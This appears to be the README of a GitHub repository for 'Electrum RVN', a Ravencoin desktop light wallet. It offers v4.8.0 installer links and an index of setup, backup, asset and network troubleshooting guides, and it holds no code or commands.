![Electrum RVN](assets/banner-hub.png)

<h1 align="center">Electrum RVN</h1>

<p align="center"><strong>Get the wallet onto a machine, and move your first RVN</strong></p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0"><img src="https://img.shields.io/badge/RELEASE-v4.8.0-384182?style=for-the-badge&labelColor=131A38" alt="Release v4.8.0"></a> <a href="https://github.com/electrum-source/Electrum-RVN/blob/2.9.x/LICENCE"><img src="https://img.shields.io/badge/LICENSE-MIT-F05239?style=for-the-badge&labelColor=131A38" alt="License MIT"></a></p>

---

## Downloads - v4.8.0

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

---


## What this repository is for

You have RVN, or you are about to buy some, and you want a desktop wallet that opens without downloading the Ravencoin chain. This repository is the first-use path in one place: the download, the first wallet, the address you hand out, the send screen, the fee, and the update that keeps the build current. Its twenty guides run in the order a new reader meets each question, from what the wallet is through to where the desktop app stops and a phone wallet begins.
What it deliberately does not cover is the other half of wallet ownership. Seed handling, restore, hardware signing and cold storage live in the backup repository, and asset issuance, mining and connection failures live in the network repository. Keeping those apart means a reader who is installing is never handed a recovery procedure at the same moment.

## Who it is for

- You are installing for the first time and want the right file, not a mirror.
- You have a wallet open and need to receive, send or read an address correctly.
- You are deciding between this desktop wallet and a phone wallet for everyday RVN.
- You are updating or removing an older install and want to know what stays behind.

## Start here

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What Is Electrum RVN? A Ravencoin Desktop Wallet Explained](https://github.com/electrum-source/download-and-setup/blob/main/what-is-electrum-rvn.md) | Electrum RVN is a desktop light wallet for Ravencoin that connects to Electrum servers instead of downloading the chain. |
| [Install Electrum RVN on Windows, macOS or Linux](https://github.com/electrum-source/download-and-setup/blob/main/install-electrum-rvn-windows-macos-linux.md) | Install on Windows, macOS or Linux in one download, then confirm the version before you create anything. |
| [How to Create a Wallet in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/create-a-wallet-in-electrum-rvn.md) | Creating a wallet takes one screen and one written-down seed, and the seed is the only copy that survives. |
| [Receiving Ravencoin in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/receiving-ravencoin-in-electrum-rvn.md) | Receive RVN by handing out an address that belongs to this wallet, after checking it starts with the right letter. |

</div>

## How to use these guides

1. Read what the wallet is before downloading, so you know it is a light client and not a node.
2. Install from the release page, matching the file to your operating system.
3. Create a wallet and write the twelve words down before the first coin arrives.
4. Receive a small amount first, then find the address again and check it starts with R.
5. Jump to the send and fee guides once the balance is visible, and to the update guide when a new release ships.

## The guides

All fifty-eight guides across the three repositories are listed here, grouped by the question they answer. The setup group is this repository's own; the other two groups live in passphrase-backup and token-and-network and are linked in full so one page covers the map.

### Understand the wallet

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What Is Electrum RVN? A Ravencoin Desktop Wallet Explained](https://github.com/electrum-source/download-and-setup/blob/main/what-is-electrum-rvn.md) | Electrum RVN is a desktop light wallet for Ravencoin that connects to Electrum servers instead of downloading the chain. |
| [Is Electrum RVN a Bitcoin Wallet? What It Actually Runs On](https://github.com/electrum-source/download-and-setup/blob/main/is-electrum-rvn-a-bitcoin-wallet.md) | It runs on Ravencoin, so a Bitcoin seed restores nothing here beyond an empty wallet on a different chain. |
| [Other Ravencoin Wallets Beside Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/other-ravencoin-wallets-beside-electrum-rvn.md) | Compare the desktop light client with the full-node wallet and the app-store wallets before you move any RVN. |
| [Ravencoin Basics for Electrum RVN Users](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-basics-for-electrum-rvn-users.md) | Ravencoin is a chain with one-minute blocks, a capped supply and a native asset layer the wallet can use. |
| [Is Electrum RVN Free and Open Source?](https://github.com/electrum-source/download-and-setup/blob/main/free-and-open-source-electrum-rvn.md) | The wallet is free to use and its code is MIT-licensed, so the licence file decides what you may rebuild. |

</div>

### Install and first use

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Install Electrum RVN on Windows, macOS or Linux](https://github.com/electrum-source/download-and-setup/blob/main/install-electrum-rvn-windows-macos-linux.md) | Install on Windows, macOS or Linux in one download, then confirm the version before you create anything. |
| [How to Create a Wallet in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/create-a-wallet-in-electrum-rvn.md) | Creating a wallet takes one screen and one written-down seed, and the seed is the only copy that survives. |
| [Receiving Ravencoin in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/receiving-ravencoin-in-electrum-rvn.md) | Receive RVN by handing out an address that belongs to this wallet, after checking it starts with the right letter. |
| [How to Find Your Electrum RVN Wallet Address](https://github.com/electrum-source/download-and-setup/blob/main/find-your-electrum-rvn-wallet-address.md) | Find the receive address on the main screen and copy it, rather than retyping a long string by hand. |
| [Ravencoin Address Format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md) | A Ravencoin address starts with R, which is how you tell it apart from a Bitcoin address before sending. |
| [Sending Ravencoin From Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/sending-ravencoin-from-electrum-rvn.md) | Send RVN by pasting the destination, choosing a fee and confirming the amounts in the review step. |
| [Electrum RVN Transaction Fees Explained](https://github.com/electrum-source/download-and-setup/blob/main/electrum-rvn-transaction-fees-explained.md) | The fee pays for block space, so a faster confirmation costs more and the wallet shows the estimate first. |

</div>

### Buying, selling and the desktop decision

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Buying Ravencoin for Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/buying-ravencoin-for-electrum-rvn.md) | Buy RVN on an exchange, then withdraw it to your own address instead of leaving it on the account. |
| [Selling Ravencoin With Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/selling-ravencoin-with-electrum-rvn.md) | Sell RVN by sending it to an exchange deposit address, and check the network and any tag before you confirm. |
| [Why Electrum RVN Is Desktop Only](https://github.com/electrum-source/download-and-setup/blob/main/why-electrum-rvn-is-desktop-only.md) | There is no mobile build, and the desktop-only decision is about key storage and signing rather than convenience. |
| [Ravencoin Mobile Wallet vs Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-mobile-wallet-vs-electrum-rvn.md) | A mobile wallet trades some control for quick payments, while the desktop wallet keeps keys on the machine you own. |
| [Electrum RVN vs Ravencoin Core](https://github.com/electrum-source/download-and-setup/blob/main/electrum-rvn-vs-ravencoin-core.md) | Ravencoin Core stores the whole chain and validates everything, while this wallet asks servers for what it needs. |
| [Does Electrum RVN Need a Full Node?](https://github.com/electrum-source/download-and-setup/blob/main/does-electrum-rvn-need-a-full-node.md) | No node is required, though the wallet can point at your own node when you want to stop trusting a public server. |

</div>

### Keep, update and remove

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Update Electrum RVN to the Latest Release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md) | Update by installing the current release over the old one, with the wallet file untouched in your user profile. |
| [Removing Electrum RVN From Your Computer](https://github.com/electrum-source/download-and-setup/blob/main/removing-electrum-rvn-from-your-computer.md) | Removing the application leaves the wallet file behind, so delete that folder only after you hold the seed. |

</div>

### Before anything goes wrong

<div align="center">

| Guide | What it answers |
| --- | --- |
| [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) | Safety here means the seed stays offline and the file stays encrypted, not that any wallet can promise no loss. |
| [Electrum RVN Security and Audit Status](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-security-audit.md) | The project describes its builds as audited and signed, and this page explains what that claim does and does not cover. |
| [How to Verify an Electrum RVN Download](https://github.com/electrum-source/passphrase-backup/blob/main/how-to-verify-an-electrum-rvn-download.md) | Check the SHA-256 of the installer against the release page before you run it, so a swapped file fails loudly. |
| [Where Electrum RVN Stores Your Wallet File](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) | The wallet file lives in your user profile rather than the program folder, which is why reinstalling does not erase it. |
| [Does Electrum RVN Collect Personal Data?](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-data-collection.md) | The wallet asks for no account and reports no telemetry, so the servers learn only what a light client must ask. |
| [Wallet File Encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md) | The wallet file is encrypted with your password, and keys are decrypted in memory only while a signature is made. |

</div>

### Back up and restore

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) | Write the twelve words on paper at creation time, because a screenshot or a note on the same disk is not a backup. |
| [Storing Your Electrum RVN Seed Offline](https://github.com/electrum-source/passphrase-backup/blob/main/storing-your-electrum-rvn-seed-offline.md) | Store the written seed away from the machine and from anything synced to a cloud account you do not control. |
| [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) | Restoring replays the words into a new wallet file, then waits for the addresses to be discovered on the chain. |
| [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md) | A zero balance after a restore usually means a different seed, a different account branch or a server that has not caught up. |
| [Forgot Your Electrum RVN Password](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md) | A forgotten password cannot be reset, so recovery means restoring from the seed and setting a new one. |
| [Electrum RVN Recovery Without the Seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md) | Without the seed, the wallet file and its password are the only path, and a lost pair leaves nothing to recover. |

</div>

### Keys, devices and cold storage

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Import a Hardware Wallet Seed Into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md) | Importing a hardware wallet seed into software defeats the device, so restore it back onto hardware instead. |
| [Export Private Keys From Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/export-private-keys-from-electrum-rvn.md) | Exporting keys moves control out of the encrypted file, so do it on an offline machine and treat the export as cash. |
| [Moving Electrum RVN to Another Computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md) | Move by restoring the seed on the new machine, or by copying the encrypted file and its password together. |
| [Electrum RVN Cold Storage Workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md) | A cold setup keeps the signing machine offline and watches the same addresses from a connected watch-only wallet. |
| [Watch-Only Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md) | A watch-only wallet holds public keys only, so it can build and track transactions but never sign one. |
| [Multisig Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/multisig-wallets-in-electrum-rvn.md) | A multisig wallet needs several keys to spend, which removes the single seed as the only point of failure. |

</div>

### Hardware signing, in practice

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Pairing a Ledger With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md) | Pairing a Ledger keeps the keys on the device while the wallet builds and broadcasts the transaction for it. |
| [Using a Trezor With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md) | Using a Trezor follows the same split, with the device signing and the wallet handling the connection and the fee. |
| [Ledger Not Detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/ledger-not-detected-by-electrum-rvn.md) | When the Ledger is not detected, the cable, the device app and the browser bridge are the three usual causes. |
| [Trezor Not Detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/trezor-not-detected-by-electrum-rvn.md) | A Trezor that is not detected usually needs its bridge, its firmware or a different USB port before anything else. |

</div>

### The asset layer

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What Is a Ravencoin Asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md) | An RVN asset is a native object on the chain with its own name and supply, not a contract wrapped around one. |
| [How to Issue a Ravencoin Asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md) | Issuing an asset claims a name on Ravencoin and sets its supply, divisibility and reissue rules in one step. |
| [Creating Ravencoin Sub-Assets in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md) | Sub-assets attach a child name to a parent you already own, at a quantity and supply you choose for it. |
| [Unique Ravencoin Assets in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/unique-ravencoin-assets-in-electrum-rvn.md) | A unique asset is issued once with a quantity of one, so there is no supply to reissue later. |
| [Transferring Ravencoin Assets With Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md) | Transfer an asset by sending it to any RVN address, with the fee paid in RVN from the same wallet. |
| [Burning and Reissuing Assets With Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/burning-and-reissuing-assets-with-electrum-rvn.md) | Burning destroys units of an asset you issued, and reissuing creates new ones where the asset allowed it. |
| [Issued Asset Missing From Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issued-asset-missing-from-electrum-rvn.md) | A missing asset after issuance is usually a confirmation wait or a server that needs a rescan before it shows. |
| [Ravencoin Asset Issuance Cost in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md) | Issuing costs a one-time charge in RVN set by the chain, which the wallet quotes before you confirm. |

</div>

### Mining and payouts

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Mine Ravencoin to an Electrum RVN Wallet](https://github.com/electrum-source/token-and-network/blob/main/mine-ravencoin-to-an-electrum-rvn-wallet.md) | Mine by pointing a miner at a pool that pays your address, since the wallet itself does not mine anything. |
| [Point a Mining Pool at Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/point-a-mining-pool-at-electrum-rvn.md) | Set the pool's payout address to this wallet and keep the wallet's copy of the seed somewhere safe. |

</div>

### When the network fights back

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Electrum RVN Not Syncing](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-not-syncing.md) | A wallet that will not sync is usually stuck on an unreachable server, so the fix starts with the server list. |
| [Electrum RVN Will Not Connect to a Server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md) | When no server answers, check the connection, the selected server and the port before you reinstall anything. |
| [Stuck Ravencoin Transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md) | A stuck transaction can be bumped with a higher fee where Replace-By-Fee was enabled when it was sent. |
| [Wrong Address Sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md) | A send to the wrong address cannot be recalled, so the check happens before confirming, not after. |

</div>

### Fees and privacy

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Ravencoin Fee Estimation in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-fee-estimation-in-electrum-rvn.md) | Fee estimates come from the server's view of recent blocks, so a quiet network quotes a lower number. |
| [Ravencoin Privacy With Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-privacy-with-electrum-rvn.md) | A light wallet reveals the addresses it asks about to its server, which is the privacy cost of skipping the chain. |

</div>

## What each guide changes

<div align="center">

| Task | Guide | Outcome |
| --- | --- | --- |
| Install the wallet | [Install Electrum RVN on Windows, macOS or Linux](https://github.com/electrum-source/download-and-setup/blob/main/install-electrum-rvn-windows-macos-linux.md) | The application is on the machine and the version matches the release page. |
| Create a wallet | [How to Create a Wallet in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/create-a-wallet-in-electrum-rvn.md) | A wallet file exists, encrypted, with the seed written down and stored away from the computer. |
| Receive RVN | [Receiving Ravencoin in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/receiving-ravencoin-in-electrum-rvn.md) | An address from this wallet is in the other party's screen and the balance appears after a confirmation. |
| Send RVN | [Sending Ravencoin From Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/sending-ravencoin-from-electrum-rvn.md) | A reviewed transaction leaves the wallet with a fee you chose, and you know where to watch it. |
| Update safely | [Update Electrum RVN to the Latest Release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md) | The new build is installed and the wallet file is untouched, so the balance and labels remain. |
| Remove the app | [Removing Electrum RVN From Your Computer](https://github.com/electrum-source/download-and-setup/blob/main/removing-electrum-rvn-from-your-computer.md) | The program is gone and the wallet file is either kept deliberately or deleted after the seed is proven. |

</div>

## Common first questions

### Do I need to download the blockchain?

No. The wallet connects to Electrum servers and requests only the transactions that touch your addresses, so there is no chain to store and no sync screen to wait behind.

### Is this a Bitcoin wallet?

It is a Ravencoin wallet built on the same light-client model, and a Bitcoin seed restores an empty wallet here because the two chains share no addresses or history.

### Where do the downloads come from?

Every file on this page is an asset of one tagged release on this repository's release page, which is also where checksums are published for comparison.

### Can I use it on a phone?

There is no mobile build, and the guides explain what a phone wallet does differently rather than pretending the desktop app can be installed on one.

### What happens if I skip the backup step?

The twelve words are the only recovery path, so a lost seed and a lost wallet file together leave the coins unspendable by anyone, including support.

## Before you install

The wallet is non-custodial: nobody can reset a password, reverse a send or restore a seed. Download only from the release page, compare the checksum before running the file, and write the twelve words down before the first coin arrives.

## About

Electrum RVN is an independent desktop wallet for Ravencoin, published from the [main repository](https://github.com/electrum-source/Electrum-RVN) and licensed MIT. These guides describe the current public release only, and every command and screen they name is one a reader can reach from the release page.

## License

The guides and the code base are MIT-licensed.

## More guides

[passphrase backup](https://github.com/electrum-source/passphrase-backup#readme) | [token and network](https://github.com/electrum-source/token-and-network#readme) | [main repository](https://github.com/electrum-source/Electrum-RVN)
